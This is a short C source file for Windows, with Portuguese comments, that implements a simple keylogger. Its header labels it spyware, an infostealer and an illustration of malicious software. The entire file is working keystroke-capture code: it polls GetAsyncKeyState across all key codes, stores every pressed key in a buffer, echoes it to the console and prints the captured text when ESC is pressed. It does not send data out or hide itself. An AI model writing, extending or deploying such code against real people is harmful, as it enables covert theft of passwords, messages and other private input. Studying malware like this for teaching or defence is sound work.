/*
 * Keylogger Simples em C (Windows)
 * main.c
 * Spyware / Infostealer
 * Typical malicious software illustration
*/

#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

int main() {
    char *keystrokes = malloc(1);
    int pos = 0;

    if (keystrokes == NULL) {
        printf("Erro ao alocar memória.\n");
        return 1;
    }

    printf("Keylogger iniciado (pressione ESC para sair)...\n");

    while (1) {
        for (int key = 8; key <= 255; key++) {
            // Verifica se tecla foi pressionada
            if (GetAsyncKeyState(key) & 1) {
                // Aloca espaço para próxima tecla
                keystrokes = realloc(keystrokes, pos + 2);
                if (keystrokes == NULL) {
                    printf("Erro de realloc.\n");
                    return 1;
                }

                if (key == VK_ESCAPE) {
                    keystrokes[pos] = '\0'; // fim da string
                    printf("\nEncerrando...\n");
                    goto fim;
                }

                keystrokes[pos++] = (char)key;
                printf("%c", (char)key); // mostra no console também
            }
        }
        Sleep(10); // reduz uso da CPU
    }

fim:
    printf("\n\nTeclas capturadas:\n%s\n", keystrokes);
    free(keystrokes);
    return 0;
}
